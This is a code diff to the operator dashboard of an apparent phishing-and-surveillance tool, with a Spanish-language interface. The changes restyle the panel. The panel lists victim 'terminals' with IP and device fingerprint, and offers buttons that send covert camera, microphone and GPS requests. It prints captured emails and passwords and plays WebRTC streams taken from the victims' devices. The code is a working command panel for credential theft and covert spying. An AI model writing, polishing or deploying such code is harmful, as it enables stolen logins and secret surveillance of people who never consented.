@@ -94,47 +94,79 @@ function updateStatsFromDevices() {
 
 function renderDevices() {
     devicesContainer.innerHTML = '';
-
-    // Filtrar solo dispositivos activos en el último minuto
     const activeDevices = getActiveDevices();
 
     if (activeDevices.length === 0) {
-        devicesContainer.innerHTML = '<p style="color: #666;">No hay dispositivos activos actualmente.</p>';
+        devicesContainer.innerHTML = `
+            <div class="no-devices" style="text-align: center; padding: 3rem; color: var(--text-muted);">
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" style="margin-bottom: 1rem; opacity: 0.3;">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                </svg>
+                <p>No se detectan terminales activas en el perímetro.</p>
+            </div>
+        `;
         return;
     }
 
     activeDevices.forEach(device => {
         const div = document.createElement('div');
         div.className = 'device-card';
-        div.style.border = '1px solid #0f0';
-        div.style.padding = '10px';
-        div.style.marginBottom = '10px';
-        div.style.borderRadius = '4px';
-
-        const statusColor = device.status === 'active' ? '#0f0' : '#888';
-
+        
+        const lastActive = new Date(device.last_active).toLocaleTimeString();
+        
         div.innerHTML = `
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-                <h3 style="margin: 0; color: #0f0;">ID: ${device.device_id}</h3>
-                <span style="color: ${statusColor};">${device.status || 'unknown'}</span>
+            <div class="device-header">
+                <div class="device-name">TERMINAL: ${device.device_id.substring(0, 8)}...</div>
+                <span class="device-status">SECURE CONNECTION</span>
             </div>
-            <p style="margin: 2px 0; font-size: 0.9em;"><strong>IP:</strong> ${device.ip || 'N/A'}</p>
-            <p style="margin: 2px 0; font-size: 0.9em;"><strong>Plataforma:</strong> ${device.platform}</p>
-            <p style="margin: 2px 0; font-size: 0.9em;"><strong>Navegador:</strong> ${device.user_agent ? device.user_agent.substring(0, 40) + '...' : ''}</p>
             
-            <div style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap;">
-                <button onclick="requestAction('${device.device_id}', 'access-camera')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Acceder Cámara</button>
-                <button onclick="requestAction('${device.device_id}', 'access-mic')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Acceder Micrófono</button>
-                <button onclick="requestAction('${device.device_id}', 'get-location')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Ubicación GPS</button>
+            <div class="device-info">
+                <div class="device-info-item"><strong>IP:</strong> ${device.ip || '0.0.0.0'}</div>
+                <div class="device-info-item"><strong>Ubicación:</strong> ${device.location ? 'GEOLOCALIZADO' : 'PENDIENTE'}</div>
+                <div class="device-info-item"><strong>Plataforma:</strong> ${device.platform}</div>
+                <div class="device-info-item"><strong>Último Pulso:</strong> ${lastActive}</div>
+            </div>
+
+            <div id="tech-sheet-${device.device_id}" style="display: none; margin-bottom: 1.2rem; padding: 1.5rem; background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px solid var(--primary); font-size: 0.75rem; font-family: 'Fira Code', monospace; line-height: 1.5;">
+                <div style="color: var(--primary); font-weight: 700; margin-bottom: 0.75rem; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; display: flex; justify-content: space-between;">
+                    <span>INTEL_REPORT // 0x${device.device_id.substring(0, 4).toUpperCase()}</span>
+                    <span style="color: var(--secondary)">VERIFIED</span>
+                </div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.8rem;">
+                    <div>• OS_PLATFORM: <span style="color: var(--text-main)">${device.platform}</span></div>
+                    <div>• IP_V4_ADDR: <span style="color: var(--secondary)">${device.ip || '0.0.0.0'}</span></div>
+                    <div>• GEO_ZONE: <span style="color: var(--text-main)">${device.timezone || 'UTC'}</span></div>
+                    <div>• CPU_CORES: <span style="color: var(--text-main)">${device.cores || 'N/A'}</span></div>
+                    <div>• RAM_ESTIM: <span style="color: var(--text-main)">${device.memory ? device.memory + ' GB' : 'N/A'}</span></div>
+                    <div>• RESOLUTION: <span style="color: var(--text-main)">${device.screen_res || 'N/A'}</span></div>
+                    <div>• COOKIES_EN: <span style="color: var(--text-main)">${device.cookies || 'N/A'}</span></div>
+                    <div>• NET_STATUS: <span style="color: var(--secondary)">${device.online || 'ONLINE'}</span></div>
+                    <div>• MAC_ADDR: <span style="color: var(--error)">[BLOCK_BY_OS]</span></div>
+                    <div>• LANG_SET: <span style="color: var(--text-main)">${device.language}</span></div>
+                </div>
+                <div style="margin-top: 0.8rem; font-size: 0.65rem; color: var(--text-muted); border-top: 1px solid var(--border); padding-top: 0.5rem; word-break: break-all;">
+                    UA: ${device.user_agent}
+                </div>
+            </div>
+            
+            <div class="device-controls">
+                <button class="control-btn" onclick="toggleTechSheet('${device.device_id}')">Ficha Técnica</button>
+                <button class="control-btn" onclick="requestAction('${device.device_id}', 'access-camera')">Cámara</button>
+                <button class="control-btn" onclick="requestAction('${device.device_id}', 'access-mic')">Micro</button>
+                <button class="control-btn" onclick="requestAction('${device.device_id}', 'get-location')">GPS</button>
             </div>
         `;
         devicesContainer.appendChild(div);
     });
 }
 
+function toggleTechSheet(deviceId) {
+    const sheet = document.getElementById(`tech-sheet-${deviceId}`);
+    sheet.style.display = sheet.style.display === 'none' ? 'block' : 'none';
+}
+
 function requestAction(deviceId, action) {
-    logToTerminal(`Enviando solicitud oculta HTTP/Broadcast a dispositivo ${deviceId}...`, 'warning');
-    // Enviaremos a través del canal en vivo global
+    logToTerminal(`Solicitud enviada: ${action.toUpperCase()} para ${deviceId}`, 'warning');
     if (window.channel) {
         window.channel.send({
             type: 'broadcast',
@@ -149,11 +181,13 @@ function renderCredentials() {
     credentialsContainer.innerHTML = '';
     credentialsData.forEach(cred => {
         const div = document.createElement('div');
-        div.style.marginBottom = '8px';
-        div.style.borderBottom = '1px solid #003300';
-        div.style.paddingBottom = '4px';
+        div.className = 'credential-item';
         const date = cred.timestamp ? new Date(cred.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
-        div.innerHTML = `<span style="color:#0f0">[${date}]</span> <strong>Device:</strong> ${cred.device_id} | <strong>User:</strong> ${cred.email} | <strong>Pass:</strong> ${cred.password}`;
+        div.innerHTML = `
+            <div style="font-size: 0.7rem; color: var(--text-muted); opacity: 0.7;">[${date}] ID: ${cred.device_id.substring(0, 6)}</div>
+            <div><span style="color: var(--primary)">U:</span> ${cred.email}</div>
+            <div><span style="color: var(--secondary)">P:</span> ${cred.password}</div>
+        `;
         credentialsContainer.appendChild(div);
     });
 }
@@ -195,24 +229,18 @@ function handleWebRTCSignal(deviceId, signal) {
                 mediaEl.autoplay = true;
                 mediaEl.controls = true;
                 mediaEl.playsInline = true;
-                // Los navegadores exigen muted=true para el Autoplay de video
                 mediaEl.muted = hasVideo; 
-                mediaEl.style.width = '300px';
-                mediaEl.style.border = '2px solid #0f0';
                 
                 const container = document.createElement('div');
-                container.style.display = 'flex';
-                container.style.flexDirection = 'column';
+                container.className = 'stream-wrapper';
+                container.style.marginBottom = '1rem';
                 container.appendChild(mediaEl);
 
                 if (hasVideo) {
                     const unmuteBtn = document.createElement('button');
-                    unmuteBtn.textContent = 'Activar Sonido (Bloqueado por el Navegador)';
-                    unmuteBtn.style.marginTop = '4px';
-                    unmuteBtn.style.background = '#002200';
-                    unmuteBtn.style.color = '#0f0';
-                    unmuteBtn.style.border = '1px solid #0f0';
-                    unmuteBtn.style.cursor = 'pointer';
+                    unmuteBtn.textContent = 'Activar Audio';
+                    unmuteBtn.className = 'control-btn';
+                    unmuteBtn.style.marginTop = '0.5rem';
                     unmuteBtn.onclick = () => { mediaEl.muted = false; unmuteBtn.style.display = 'none'; };
                     container.appendChild(unmuteBtn);
                 }
